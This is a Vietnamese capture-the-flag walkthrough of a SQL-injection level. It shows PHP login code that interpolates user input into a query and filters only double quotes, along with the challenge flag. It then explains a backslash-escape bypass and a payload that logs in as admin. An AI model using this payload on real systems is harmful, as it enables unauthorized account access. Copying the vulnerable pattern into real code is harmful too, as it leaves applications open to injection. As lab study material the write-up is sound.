# **Level 4:**
```php
<?php
function checkValid($data)
{
    if (strpos($data, '"') !== false)
        return false;
    return true;
}

function loginHandler($username, $password)
{
    if (!checkValid($username) || !checkValid($password))
        return "Hack detected";

    try {
        include("db.php");
        $database = make_connection("hashed_db");

        $sql = "SELECT username FROM users WHERE username=LOWER(\"$username\") AND password=MD5(\"$password\")";
        $query = $database->query($sql);
        $row = $query->fetch_assoc(); // Get the first row

        if ($row === NULL)
            return "Wrong username or password"; // No result

        $login_user = $row["username"];
        if ($login_user === "admin")
            return "Wow you can log in as admin, here is your flag flag{44682b8def08e0fe9cdcb079e7db4dc0}, but how about <a href='level5.php'>THIS LEVEL</a>!";
        else
            return "You log in as $login_user, but then what? You are not an admin";
    } catch (mysqli_sql_exception $e) {
        return $e->getMessage();
    }
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
    $username = $_POST["username"];
    $password = $_POST["password"];
    $message = loginHandler($username, $password);
}

include("static/html/login.html");

```
Level 4 này nó có kiểm tra trong dữ liệu nhập vào có dấu nháy kép hay không ?

Chúng ta có thể bypass bằng cách Hex những giá trị nằm trong dấu nháy kép và thêm 0x vào trước chuỗi Hex đó

Hoặc là: Bạn có thể sử dụng luôn dấu nháy đơn cũng được , Bởi vì PHP nó không quan trọng trong câu truy vấn đó phải đóng mở giá trị bằng nháy đơn hay nháy kép . Ví dụ :
```sql
username=LOWER("$username") AND password=MD5('$password')
```
Nhưng vấn đề là làm sao để đóng cái nháy kép đầu tiên ở username lại . -> Chúng ta sử dụng dấu Escape `\` . Như vậy khi vào trong Database sẽ là:
```sql
SELECT username FROM users WHERE username=LOWER("\") AND password=MD5("$password")
```
Dấu Escape đã làm cho dấu nháy kép vốn dùng để đóng cái giá trị nhập vào nay lại trở thành một chuỗi văn bản vô hại. Và vì thế dấu nháy kép của password vốn dùng để mở cái giá trị nhập vào lại trở thành cái đóng giá trị nhập vào của username 
```
username: ") AND password=MD5(
```
Sau khi đóng cái được cái dấu nháy kép của username lại rồi thì chúng ta cần đóng thêm ngoặc tròn kia nữa . Vậy thì ở password chúng ta nhập vào 
```
password: ) -- -
```
Vậy thì khi vào Database sẽ là:
```sql
SELECT username FROM users WHERE username=LOWER("\") AND password=MD5(") -- - ")
```
Vậy cuối cùng payload cần truyền là 
```sql
username: \
password: ) or username = 'admin' -- -
```
Khi vào truy Database nó sẽ là:
```sql
SELECT username FROM users WHERE username=LOWER("\") AND password=MD5(") or username = 'admin' -- -
```
Kết quả là: 

<img width="1494" height="810" alt="image" src="https://github.com/user-attachments/assets/1eed49f4-78ec-4b8c-b772-c20e07c48756" />

Done Level 4 nhe !!!
